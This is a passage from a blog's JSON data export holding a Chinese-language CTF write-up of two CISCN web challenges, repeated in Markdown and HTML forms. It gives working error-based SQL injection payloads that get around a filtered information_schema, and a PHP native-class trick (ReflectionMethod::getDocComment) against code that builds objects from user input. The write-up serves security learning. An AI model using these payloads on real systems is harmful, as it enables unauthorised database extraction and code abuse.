*/\"\n```\n\n\n\n题外话：在尝试过程中还发现了另一个类`ReflectionClass`\n\n> 简介：**ReflectionClass** 类报告了一个类的有关信息。\n\n和上面的那个类对比，两个类研究的对象不一样**ReflectionMethod**研究的是类中的方法，**ReflectionClass** 研究的是类。\n\n这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。\n\n","source":"_posts/CISCN线上赛库存.md","raw":"---\ntitle: CISCN线上赛库存\ndate: 2021-08-18 17:21:24\ntags: \n- web\n- sql注入\n- php原生类\ncategories: \n- CTF\n---\n\n# easy_sql\n\n在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是**括号单引号闭合**\n\n> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1') LIMIT 0,1' at line 1\n\n过滤的字符有union，所以尝试报错注入，查询版本号。\n\n```\nadmin') and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#\n```\n\n接下来想要通过**information_schema**库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。\n\n最后参考了网上的一篇文章：[mysql 注入 information_schema_绕过IDS过滤information_schema继续注入](https://blog.csdn.net/weixin_35867608/article/details/113937118)，模仿文章构造payload\n\n```\nadmin') and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#\n```\n\n回显为：Duplicate column name 'no'，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段\n\n```\nDuplicate column name '28d9f90a-4120-4ee8-9079-4e7613699510'\n```\n\n直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了\n\n```\nadmin') and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#\n```\n\nflag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}\n\n# easy_source\n\n使用目录扫描，扫描到了`.index.php.swo`\n\n```\n本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？\n<?php\nclass User\n{\n    private static $c = 0;\n\n    function a()\n    {\n        return ++self::$c;\n    }\n\n    function b()\n    {\n        return ++self::$c;\n    }\n\n    function c()\n    {\n        return ++self::$c;\n    }\n\n    function d()\n    {\n        return ++self::$c;\n    }\n\n    function e()\n    {\n        return ++self::$c;\n    }\n\n    function f()\n    {\n        return ++self::$c;\n    }\n\n    function g()\n    {\n        return ++self::$c;\n    }\n\n    function h()\n    {\n        return ++self::$c;\n    }\n\n    function i()\n    {\n        return ++self::$c;\n    }\n\n    function j()\n    {\n        return ++self::$c;\n    }\n\n    function k()\n    {\n        return ++self::$c;\n    }\n\n    function l()\n    {\n        return ++self::$c;\n    }\n\n    function m()\n    {\n        return ++self::$c;\n    }\n\n    function n()\n    {\n        return ++self::$c;\n    }\n\n    function o()\n    {\n        return ++self::$c;\n    }\n\n    function p()\n    {\n        return ++self::$c;\n    }\n\n    function q()\n    {\n        return ++self::$c;\n    }\n\n    function r()\n    {\n        return ++self::$c;\n    }\n\n    function s()\n    {\n        return ++self::$c;\n    }\n\n    function t()\n    {\n        return ++self::$c;\n    }\n    \n}\n\n$rc=$_GET[\"rc\"];\n$rb=$_GET[\"rb\"];\n$ra=$_GET[\"ra\"];\n$rd=$_GET[\"rd\"];\n$method= new $rc($ra, $rb);\nvar_dump($method->$rd());\n```\n\n看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个`$ra`、`$rb`\n\n，源码虽然给出了`User`类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。\n\n根据提示\n\n> 虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？\n\n应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个`ReflectionMethod`类，并且`ReflectionMethod`类中刚好有一个`getDocComment` 方法可以获得注释：\n\n> 简介：**ReflectionMethod** 类报告了一个方法的有关信息。类报告了一个方法的有关信息\n>\n> ReflectionFunctionAbstract::getDocComment — 获取注释内容\n\n源码中初始化创建对象为`new $rc($ra, $rb)`，传递了两个参数，`ReflectionMethod`类的初始化魔术方法也提供了两个参数\n\n> public ReflectionMethod::__construct ( [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) `$class` , string `$name` )\n\n所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释\n\npayload\n\n```\n?rc=ReflectionMethod&ra=User&rb=q&rd=getDocComment\n```\n\n结果\n\n```\n你能发现我吗string(152) \"/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */\"\n```\n\n\n\n题外话：在尝试过程中还发现了另一个类`ReflectionClass`\n\n> 简介：**ReflectionClass** 类报告了一个类的有关信息。\n\n和上面的那个类对比，两个类研究的对象不一样**ReflectionMethod**研究的是类中的方法，**ReflectionClass** 研究的是类。\n\n这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。\n\n","slug":"CISCN线上赛库存","published":1,"updated":"2021-12-30T09:42:54.175Z","_id":"ckshahdvf0000qwtcd4y42gjc","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"easy-sql\"><a href=\"#easy-sql\" class=\"headerlink\" title=\"easy_sql\"></a>easy_sql</h1><p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是<strong>括号单引号闭合</strong></p>\n<blockquote>\n<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1’) LIMIT 0,1’ at line 1</p>\n</blockquote>\n<p>过滤的字符有union，所以尝试报错注入，查询版本号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#</span><br></pre></td></tr></table></figure>\n\n<p>接下来想要通过<strong>information_schema</strong>库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。</p>\n<p>最后参考了网上的一篇文章：<a href=\"https://blog.csdn.net/weixin_35867608/article/details/113937118\">mysql 注入 information_schema_绕过IDS过滤information_schema继续注入</a>，模仿文章构造payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#</span><br></pre></td></tr></table></figure>\n\n<p>回显为：Duplicate column name ‘no’，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Duplicate column name &#x27;28d9f90a-4120-4ee8-9079-4e7613699510&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#</span><br></pre></td></tr></table></figure>\n\n<p>flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</p>\n<h1 id=\"easy-source\"><a href=\"#easy-source\" class=\"headerlink\" title=\"easy_source\"></a>easy_source</h1><p>使用目录扫描，扫描到了<code>.index.php.swo</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class User</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    private static $c = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">    function a()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function b()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function c()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function d()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function e()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function f()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function g()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function h()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function i()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function j()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function k()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function l()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function m()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function n()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function o()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function p()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function q()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function r()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function s()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function t()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$rc=$_GET[&quot;rc&quot;];</span><br><span class=\"line\">$rb=$_GET[&quot;rb&quot;];</span><br><span class=\"line\">$ra=$_GET[&quot;ra&quot;];</span><br><span class=\"line\">$rd=$_GET[&quot;rd&quot;];</span><br><span class=\"line\">$method= new $rc($ra, $rb);</span><br><span class=\"line\">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>\n\n<p>看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个<code>$ra</code>、<code>$rb</code></p>\n<p>，源码虽然给出了<code>User</code>类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。</p>\n<p>根据提示</p>\n<blockquote>\n<p>虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</p>\n</blockquote>\n<p>应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个<code>ReflectionMethod</code>类，并且<code>ReflectionMethod</code>类中刚好有一个<code>getDocComment</code> 方法可以获得注释：</p>\n<blockquote>\n<p>简介：<strong>ReflectionMethod</strong> 类报告了一个方法的有关信息。类报告了一个方法的有关信息</p>\n<p>ReflectionFunctionAbstract::getDocComment — 获取注释内容</p>\n</blockquote>\n<p>源码中初始化创建对象为<code>new $rc($ra, $rb)</code>，传递了两个参数，<code>ReflectionMethod</code>类的初始化魔术方法也提供了两个参数</p>\n<blockquote>\n<p>public ReflectionMethod::__construct ( <a href=\"https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed\">mixed</a> <code>$class</code> , string <code>$name</code> )</p>\n</blockquote>\n<p>所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你能发现我吗string(152) &quot;/** * Increment counter * * @final * @static * @access publicCISCN&#123;uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-&#125; * @return int */&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>题外话：在尝试过程中还发现了另一个类<code>ReflectionClass</code></p>\n<blockquote>\n<p>简介：<strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p>\n</blockquote>\n<p>和上面的那个类对比，两个类研究的对象不一样<strong>ReflectionMethod</strong>研究的是类中的方法，<strong>ReflectionClass</strong> 研究的是类。</p>\n<p>这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"easy-sql\"><a href=\"#easy-sql\" class=\"headerlink\" title=\"easy_sql\"></a>easy_sql</h1><p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是<strong>括号单引号闭合</strong></p>\n<blockquote>\n<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1’) LIMIT 0,1’ at line 1</p>\n</blockquote>\n<p>过滤的字符有union，所以尝试报错注入，查询版本号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#</span><br></pre></td></tr></table></figure>\n\n<p>接下来想要通过<strong>information_schema</strong>库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。</p>\n<p>最后参考了网上的一篇文章：<a href=\"https://blog.csdn.net/weixin_35867608/article/details/113937118\">mysql 注入 information_schema_绕过IDS过滤information_schema继续注入</a>，模仿文章构造payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#</span><br></pre></td></tr></table></figure>\n\n<p>回显为：Duplicate column name ‘no’，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Duplicate column name &#x27;28d9f90a-4120-4ee8-9079-4e7613699510&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#</span><br></pre></td></tr></table></figure>\n\n<p>flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</p>\n<h1 id=\"easy-source\"><a href=\"#easy-source\" class=\"headerlink\" title=\"easy_source\"></a>easy_source</h1><p>使用目录扫描，扫描到了<code>.index.php.swo</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class User</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    private static $c = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">    function a()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function b()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function c()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function d()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function e()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function f()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function g()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function h()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function i()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function j()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function k()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function l()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function m()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function n()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function o()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function p()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function q()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function r()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function s()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function t()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return ++self::$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$rc=$_GET[&quot;rc&quot;];</span><br><span class=\"line\">$rb=$_GET[&quot;rb&quot;];</span><br><span class=\"line\">$ra=$_GET[&quot;ra&quot;];</span><br><span class=\"line\">$rd=$_GET[&quot;rd&quot;];</span><br><span class=\"line\">$method= new $rc($ra, $rb);</span><br><span class=\"line\">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>\n\n<p>看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个<code>$ra</code>、<code>$rb</code></p>\n<p>，源码虽然给出了<code>User</code>类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。</p>\n<p>根据提示</p>\n<blockquote>\n<p>虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</p>\n</blockquote>\n<p>应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个<code>ReflectionMethod</code>类，并且<code>ReflectionMethod</code>类中刚好有一个<code>getDocComment</code> 方法可以获得注释：</p>\n<blockquote>\n<p>简介：<strong>ReflectionMethod</strong> 类报告了一个方法的有关信息。类报告了一个方法的有关信息</p>\n<p>ReflectionFunctionAbstract::getDocComment — 获取注释内容</p>\n</blockquote>\n<p>源码中初始化创建对象为<code>new $rc($ra, $rb)</code>，传递了两个参数，<code>ReflectionMethod</code>类的初始化魔术方法也提供了两个参数</p>\n<blockquote>\n<p>public ReflectionMethod::__construct ( <a href=\"https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed\">mixed</a> <code>$class</code> , string <code>$name</code> )</p>\n</blockquote>\n<p>所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td 